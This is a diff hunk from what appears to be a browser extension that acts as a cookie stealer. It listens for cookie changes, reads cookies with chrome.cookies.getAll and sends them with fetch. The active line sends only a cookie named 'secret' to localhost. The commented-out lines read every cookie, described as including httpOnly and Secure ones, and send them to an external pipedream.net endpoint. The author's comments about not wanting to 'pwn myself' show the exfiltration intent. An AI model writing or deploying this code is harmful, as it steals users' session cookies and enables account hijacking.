@@ -7,8 +7,8 @@ chrome.cookies.onChanged.addListener(() => {
 });
 
 function logCookie() {
-  chrome.cookies.getAll({ name: "secret" }, (r) => {
-    // chrome.cookies.getAll({}, (r) => {
+  chrome.cookies.getAll({ name: "secret" }, (r) => { // for testing purposes, I don't wanna pwn myself
+  // chrome.cookies.getAll({}, (r) => { // no cookies are safe, even httpOnly, sameSite, Secure types
     console.log(r);
     fetch(`http://localhost:6900/`, {
     // fetch(`https://en974z7hs59e3gc.m.pipedream.net/`, {
